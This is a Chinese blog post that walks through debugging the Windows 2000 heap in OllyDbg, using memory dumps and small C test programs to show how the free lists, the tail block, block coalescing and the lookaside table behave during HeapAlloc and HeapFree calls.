+<h3 id="调试观察空表"><a href="#调试观察空表" class="headerlink" title="调试观察空表"></a>调试观察空表</h3><h4 id="空表索引区Freelist-128"><a href="#空表索引区Freelist-128" class="headerlink" title="空表索引区Freelist[128]"></a>空表索引区Freelist[128]</h4><p>空表索引区位于偏移0x178处,即0x390178</p>
+<p>一个刚初始化的堆,其状态如下</p>
+<p>1.只有一个空闲大块,叫做尾块</p>
+<p>2.该尾快位于堆偏移0x688处</p>
+<p>3.Freelist[0]指向”尾块”</p>
+<p>4.除零号空表索引外,其余各项索引指向自己,即没有空闲块</p>
+<p>空表索引,即Freelist表,其第0项的偏移就是Freelist表的偏移,0x178+0x390000=0x390178,这个位置长这样</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919184326162.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919184326162.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220919184326162"></p>
+<p>Freelist[0]上只挂着尾块,因此前后指针都是指向尾块的,尾块的地址是0x00390688,即堆偏移0x688的地方</p>
+<p>其他的空表索引Freelist[n]的两个指针都是指向自己,整个Freelist数组一共有128项,每项两个4字节指针,共<code>128*4*2=1024=0x400</code>字节,从0x390178到0x390578全都是Freelist</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919190028685.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919190028685.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220919190028685"></p>
+<p>一直持续到0x390578</p>
+<p><img src="../AppData/Roaming/Typora/typora-user-images/image-20220919190022123.png" class="lazyload placeholder" data-srcset="../AppData/Roaming/Typora/typora-user-images/image-20220919190022123.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220919190022123"></p>
+<h4 id="分配"><a href="#分配" class="headerlink" title="分配"></a>分配</h4><p>重新从win2k上用od调试了一下,现在堆基址是0x360000</p>
+<p>下面是六次分割</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">3</span>);</span><br><span class="line">h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">5</span>);</span><br><span class="line">h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">6</span>);</span><br><span class="line">h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">h5 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">19</span>);</span><br><span class="line">h6 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">24</span>);</span><br></pre></td></tr></table></figure>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>堆句柄</th>
+<th>希望请求字节数</th>
+<th>实际分配堆块的字节数</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>h1</td>
+<td>3</td>
+<td>16</td>
+</tr>
+<tr>
+<td>h2</td>
+<td>5</td>
+<td>16</td>
+</tr>
+<tr>
+<td>h3</td>
+<td>6</td>
+<td>16</td>
+</tr>
+<tr>
+<td>h4</td>
+<td>8</td>
+<td>16</td>
+</tr>
+<tr>
+<td>h5</td>
+<td>19</td>
+<td>32</td>
+</tr>
+<tr>
+<td>h6</td>
+<td>24</td>
+<td>32</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h5 id="分割之前"><a href="#分割之前" class="headerlink" title="分割之前"></a>分割之前</h5><p>分割之前的尾块</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919202335032.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919202335032.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220919202335032"></p>
+<p>flags=0x10表示尾块</p>
+<h5 id="第一次分割"><a href="#第一次分割" class="headerlink" title="第一次分割"></a>第一次分割</h5><p>第一次分割时</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919202432017.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919202432017.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220919202432017"></p>
+<p>ESI作为第一个参数,是CreateHeap返回的堆句柄0x360000</p>
+<p>8是要初始化该片空间为0,实际是枚举值HEAP_ZERO_MEMORY</p>
+<p>3是希望申请的字节数</p>
+<p>edi中放着的是AllocateHeap函数的地址</p>
+<p>call edi之后0x360680附近发生了变化</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919204334903.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919204334903.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220919204334903"></p>
+<p>call的返回值放在eax中,此时为0x360688,这意味着h1堆块data地址,这是原来的尾块data</p>
+<p>那么h1堆块首就得在0x360680了,这是原来的尾块首</p>
+<p>h1堆块首中的数据:</p>
+<p>大小0x0002,(单位8字节),即16字节</p>
+<p>上一个块的大小0x0008(啥意义呢?)</p>
+<p>Flags=01,busy</p>
+<p>unused bytes=0x0D,13个字节?</p>
+<p>然后h1堆块数据的前四个字节确实置零了,但是后面四个字节依然保持着尾块首留下的指针,因为我们只希望申请3个字节,本来给16个字节其中data占8字节就已经是为了遵守硬性要求,8字节对齐了,前四个字节够用了,后面四个字节不用清零</p>
+<p>尾块此时的大小0x12E相比于0x130少了2(单位8字节),正好是h1堆块首和data的大小,尾块的第二个八字节依然是两个指针,指向freelist[0]</p>
+<p>此时freelist[0]@0x00360178其上的值也修改了</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919205258485.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919205258485.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220919205258485"></p>
+<p>实时修改为当前尾块data地址</p>
+<h5 id="六次分割后"><a href="#六次分割后" class="headerlink" title="六次分割后"></a>六次分割后</h5><p>继续调试,直到六次分配完成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00360680  02 00 08 00 00 01 0D 00 00 00 00 00 78 01 36 00  .........x6.//h1</span><br><span class="line">00360690  02 00 02 00 00 01 0B 00 00 00 00 00 00 01 36 00  .........6.//h2,希望5字节于是只有data前5字节初始化为0</span><br><span class="line">003606A0  02 00 02 00 00 01 0A 00 00 00 00 00 00 00 36 00  ...........6.//h3,希望6字节于是只有data前6字节初始化为0</span><br><span class="line">003606B0  02 00 02 00 00 01 08 00 00 00 00 00 00 00 00 00  ............//h4</span><br><span class="line">003606C0  04 00 02 00 00 01 0D 00 00 00 00 00 00 00 00 00  .............//h5</span><br><span class="line">003606D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">003606E0  04 00 04 00 00 01 08 00 00 00 00 00 00 00 00 00  ............//h6</span><br><span class="line">003606F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00360700  20 01 04 00 00 10 00 00 78 01 36 00 78 01 36 00   ....x6.x6.//尾块</span><br><span class="line">00360710  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00360720  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br></pre></td></tr></table></figure>
+<p>此时尾块大小已经减为0x120(单位8字节),其两个指针仍然是指向0x00360178,</p>
+<p>freelist[0]@0x00360178的两个指针必然也指向了0x360708</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919210617841.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919210617841.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220919210617841"></p>
+<p>被申请走的堆块,对于系统中的堆来说,算是平白无故就没了,无法通过任何方式索引到拿走的堆块,只有是用户程序归还的时候,系统才可以把堆块重新放到Freelist里面,这时候就不是放到尾块里面了,16字节的块(包括首部)应该放到freelist[2]</p>
+<h4 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h4><h5 id="释放h1"><a href="#释放h1" class="headerlink" title="释放h1"></a>释放h1</h5><p>释放是从h1开始的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HeapFree(hp,<span class="number">0</span>,h1); <span class="comment">//free to freelist[2] </span></span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h3); <span class="comment">//free to freelist[2] </span></span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h5); <span class="comment">//free to freelist[4]</span></span><br><span class="line"></span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h4); <span class="comment">//coalese h3,h4,h5,link the large block to freelist[8]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919211337324.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919211337324.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220919211337324"></p>
+<p>esi=0x360000是hp句柄</p>
+<p>dwflags=0没有任何标志</p>
+<p>ebx是h1句柄,这里貌似有一个编译优化,在h1堆申请完毕之后,h1句柄是放在eax中的,在h2堆申请之前,eax又放到了ebx中,从那到现在ebx中一直都是h1句柄没有改变</p>
+<p>调用之后eax=1,表示执行成功</p>
+<p>此时的 h1堆块@0x360680发生了变化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">释放之前</span><br><span class="line">00360680  02 00 08 00 00 01 0D 00 00 00 00 00 78 01 36 00  .........x6.//h1</span><br><span class="line">释放之后</span><br><span class="line">00360680  02 00 08 00 00 00 0D 00 88 01 36 00 88 01 36 00  ......?6.?6.</span><br></pre></td></tr></table></figure>
+<p>其变化为,标志位又回归0,表示空闲,第二个八字节,原来是data的开始现在又变成了两个指针,都指向0x00360188</p>
+<p>这是啥位置呢?</p>
+<p>Freelist@0x00360178,</p>
+<p>Freelist[0]@0x00360178</p>
+<p>Freelist[1]@0x00360180</p>
+<p>Freelist[2]@0x00360188</p>
+<p>即原来的h1所在堆块,现在链接回了Freelist[2]上</p>
+<blockquote>
+<p>有意思的是,8字节的堆块首+8字节的data,已经是占用堆块的最小规格了,最小规格的堆块释放之后才能挂到Freelist[2]上,那么Freelist[1]上应该挂什么呢?</p>
+<p>如果根据Freelist[n]指向的堆块大小为8n(包括堆块首和堆块data),那么Freelist[1]指向的堆块应该是8字节的首+0字节的data,这个堆块是个寂寞吧</p>
+</blockquote>
+<h5 id="前三次释放后"><a href="#前三次释放后" class="headerlink" title="前三次释放后"></a>前三次释放后</h5><p>前三次释放分别是h1,h3,h5,这是三个不连续的堆块,不会发生合并</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">//三次释放前</span><br><span class="line">00360680  02 00 08 00 00 01 0D 00 00 00 00 00 78 01 36 00  .........x6.//h1</span><br><span class="line">00360690  02 00 02 00 00 01 0B 00 00 00 00 00 00 01 36 00  .........6.//h2,希望5字节于是只有data前5字节初始化为0</span><br><span class="line">003606A0  02 00 02 00 00 01 0A 00 00 00 00 00 00 00 36 00  ...........6.//h3,希望6字节于是只有data前6字节初始化为0</span><br><span class="line">003606B0  02 00 02 00 00 01 08 00 00 00 00 00 00 00 00 00  ............//h4</span><br><span class="line">003606C0  04 00 02 00 00 01 0D 00 00 00 00 00 00 00 00 00  .............//h5</span><br><span class="line">003606D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">003606E0  04 00 04 00 00 01 08 00 00 00 00 00 00 00 00 00  ............//h6</span><br><span class="line">003606F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00360700  20 01 04 00 00 10 00 00 78 01 36 00 78 01 36 00   ....x6.x6.//尾块</span><br><span class="line">00360710  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//三次释放后</span><br><span class="line">00360680  02 00 08 00 00 00 0D 00 A8 06 36 00 88 01 36 00  ......?6.?6.//h1</span><br><span class="line">00360690  02 00 02 00 00 01 0B 00 00 00 00 00 00 01 36 00  .........6.//h2</span><br><span class="line">003606A0  02 00 02 00 00 00 0A 00 88 01 36 00 88 06 36 00  ......?6.?6.//h3</span><br><span class="line">003606B0  02 00 02 00 00 01 08 00 00 00 00 00 00 00 00 00  ............//h4</span><br><span class="line">003606C0  04 00 02 00 00 00 0D 00 98 01 36 00 98 01 36 00  ......?6.?6.//h5</span><br><span class="line">003606D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">003606E0  04 00 04 00 00 01 08 00 00 00 00 00 00 00 00 00  ............//h6</span><br><span class="line">003606F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00360700  20 01 04 00 00 10 00 00 78 01 36 00 78 01 36 00   ....x6.x6.//尾块</span><br><span class="line">00360710  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>三次释放前后h2,h4,h6没有发生任何变化,尾块也没有发生任何变化</p>
+<p>三次释放前后发生变化的有h1,h3,h5,发生的变化也是很有规律的,首先是flag从1到0,意思是从占用到空闲</p>
+<p>每个堆块的第二个八字节,都变成了两个指针</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>释放堆块</th>
+<th>释放后的前一个指针值</th>
+<th>释放后的后一个指针值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>h1@00360688</td>
+<td>0x003606A8</td>
+<td>0x00360188</td>
+</tr>
+<tr>
+<td>h3@003606A8</td>
+<td>0x00360188</td>
+<td>0x00360688</td>
+</tr>
+<tr>
+<td>h5@003606C8</td>
+<td>0x00360198</td>
+<td>0x00360198</td>
+</tr>
+<tr>
+<td>Freelist[2]@0x00360188</td>
+<td>0x00360688</td>
+<td>0x003606A8</td>
+</tr>
+<tr>
+<td>Freelist[4]@0x00360198</td>
+<td>0x003606C8</td>
+<td>0x003606C8</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>Freelist表也发生了变化</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919214452673.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919214452673.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="Freelist"></p>
+<blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Freelist[<span class="number">0</span>]@<span class="number">0x00360178</span></span><br><span class="line">Freelist[<span class="number">1</span>]@<span class="number">0x00360180</span></span><br><span class="line">Freelist[<span class="number">2</span>]@<span class="number">0x00360188</span></span><br><span class="line">Freelist[<span class="number">3</span>]@<span class="number">0x00360190</span></span><br><span class="line">Freelist[<span class="number">4</span>]@<span class="number">0x00360198</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>相当于画在下图中的状态</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920080020364.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920080020364.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220920080020364"></p>
+<h4 id="合并"><a href="#合并" class="headerlink" title="合并"></a>合并</h4><p>前面三个释放,都不是连续的堆地址,现在要再释放h4,他和h3,h5是连续的,又会发生什么呢?</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HeapFree(hp,0,h4); //coalese h3,h4,h5,link the large block to freelist[8]</span><br></pre></td></tr></table></figure>
+<p>h4堆块的大小是16字节(8首部+8data),有可能要和已经释放的h1,h3进行合并</p>
+<p>执行后的Freelist</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Freelist[0]@00360178  08 07 36 00 08 07 36 00  6.6.</span><br><span class="line">Freelist[1]@00360180  80 01 36 00 80 01 36 00  €6.€6.</span><br><span class="line">Freelist[2]@00360188  88 06 36 00 88 06 36 00  ?6.?6.</span><br><span class="line">Freelist[3]@00360190  90 01 36 00 90 01 36 00  ?6.?6.</span><br><span class="line">Freelist[4]@00360198  98 01 36 00 98 01 36 00  ?6.?6.</span><br><span class="line">Freelist[5]@003601A0  A0 01 36 00 A0 01 36 00  ?6.?6.</span><br><span class="line">Freelist[6]@003601A8  A8 01 36 00 A8 01 36 00  ?6.?6.</span><br><span class="line">Freelist[7]@003601B0  B0 01 36 00 B0 01 36 00  ?6.?6.</span><br><span class="line">Freelist[8]@003601B8  A8 06 36 00 A8 06 36 00  ?6.?6.</span><br></pre></td></tr></table></figure>
+<p>从h1,3,5释放完成后到h4释放完成后,发生变化的Freelist记录有</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Freelist[2]@0x00360188</span><br><span class="line">Freelist[4]@0x00360198</span><br><span class="line">Freelist[8]@0x003601B8</span><br></pre></td></tr></table></figure>
+<p>可以看出Freelist[2]原来后面挂着两个节点h1@00360688,h3@003606A8,现在只剩下一个h1@0x00360688</p>
+<p>Freelist[4]原来后面挂着h5@003606C8,现在指向自己了,后面啥也没挂</p>
+<p>Freelist[8]后面挂了一个H@0x003606A8</p>
+<p>也就是说消失了h3,h5,还有一个h4,恰好他仨是顺序的,是不是Freelist[8]后面挂着的这个就是呢?去0x003606A0看看这个堆块首部</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">003606A0  08 00 02 00 00 00 0A 00  ......</span><br><span class="line">003606A8  B8 01 36 00 B8 01 36 00  ?6.?6.</span><br></pre></td></tr></table></figure>
+<p>SelfSize=0x0008(单位8字节),即64字节</p>
+<p>Flags=0,空闲状态</p>
+<p>前指针Freelist[8]@0x3601B8,</p>
+<p>后指针Freelist[8]@0x3601B8</p>
+<p>而h3,4都是8+8=16的堆块,h5是8+24=32的堆块,合起来正好是64字节</p>
+<p>这证明Freelist[8]上挂着的就是h3,4,5合并起来的堆块</p>
+<h3 id="调试观察快表"><a href="#调试观察快表" class="headerlink" title="调试观察快表"></a>调试观察快表</h3><p>药引子长这样</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	HLOCAL h1,h2,h3,h4;</span><br><span class="line">	HANDLE hp;</span><br><span class="line">	hp = HeapCreate(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">	h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">24</span>);</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h1);</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h2);</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h3);</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h4);</span><br><span class="line">	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>与调试空表时的区别就在HeapCreate函数这里</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);<span class="comment">//调试空表时</span></span><br><span class="line">hp = HeapCreate(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);<span class="comment">//调试快表时</span></span><br></pre></td></tr></table></figure>
+<p><code>HeapCreate(0,0,0);</code>这样才能启用快表</p>
+<h4 id="call-HeapCreate"><a href="#call-HeapCreate" class="headerlink" title="call HeapCreate"></a>call HeapCreate</h4><p>调用HeapCreate之后,返回值堆区句柄eax=0x360000</p>
+<p>此时的空表Freelist和之前不一样了,Freelist[0]@0x00360178挂着的尾块在0x00361E90了,原来是在0x360688</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920110236696.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920110236696.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220920110236696"></p>
+<h4 id="从尾块分配"><a href="#从尾块分配" class="headerlink" title="从尾块分配"></a>从尾块分配</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);<span class="comment">//希望从hp堆申请8字节空间,初始化为0</span></span><br></pre></td></tr></table></figure>
+<p>这一条执行之后,返回的堆空间句柄eax=0x361E90,到这里看看</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920112928353.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920112928353.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220920112928353"></p>
+<p>0x361E88开始的八个字节是堆块首</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/head.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/head.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="head"></p>
+<p>selfsize=0x0002(单位8字节),即堆块首加上data共16字节</p>
+<p>Flag=0x01,已占用</p>
+<p>unused bytes=8,有8字节尚未使用</p>
+<blockquote>
+<p>此时Freelist[0]指向的尾块也发生了变化</p>
+<p>Freelist[0]@0x00360178</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920122010974.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920122010974.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220920122010974"></p>
+<p>尾块原来在0x00361E90,现在下移到了0x00361EA0</p>
+</blockquote>
+<p>说明刚才的堆块仍然是从尾块上割出去的</p>
+<p>当四条HeapAlloc都执行完成之后</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">24</span>);</span><br></pre></td></tr></table></figure>
+<p>下面就到了HeapFree了,此时就和之前不同了</p>
+<h4 id="但是还给快表"><a href="#但是还给快表" class="headerlink" title="但是还给快表"></a>但是还给快表</h4><p>调试空表时,HeapAlloc申请的空间,使用HeapFree之后会归给还到空表,并且相邻的堆块还会进行合并</p>
+<p>而本次调试,HeapAlloc申请的空间,将会还给快表</p>
+<h5 id="释放h1-1"><a href="#释放h1-1" class="headerlink" title="释放h1"></a>释放h1</h5><p>第一次释放的时h1@0x361E90</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HeapFree(hp,<span class="number">0</span>,h1);</span><br></pre></td></tr></table></figure>
+<p>到0x361E90看看</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920142559502.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920142559502.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220920142559502"></p>
+<p>self size=0x02,即16字节</p>
+<p>flags=0x01,因为快表中的节点都标记为已占用</p>
+<p>unused bytes=0x08未使用字节数</p>
+<p>再到快表看看</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920143027699.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920143027699.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220920143027699"></p>
+<p>Lookaside[1]@0x3606E8此时其上的指针为0x00361E90,正好就是刚才释放的h1@0x00361E90</p>
+<h5 id="释放h2"><a href="#释放h2" class="headerlink" title="释放h2"></a>释放h2</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HeapFree(hp,<span class="number">0</span>,h2);</span><br></pre></td></tr></table></figure>
+<p>h2和h1一样都是8字节堆首+8字节data,并且两者的地址相邻,释放h2之后会不会发生堆块合并呢?快表没这个能力</p>
+<p>执行之后Lookaside[1]@0x3606E8指向h2@0x361EA0了,原来是指向h1@0x00361E90的</p>
+<p>这就纳闷了,h1@0x00361E90这个堆块目前被谁索引着呢?找不到它不就内存泄漏了吗</p>
+<p>到h2@0x361EA0看看</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920150733600.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920150733600.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220920150733600"></p>
+<p>原来是h2指向了h1</p>
+<p>目前快表是这样一个状态</p>
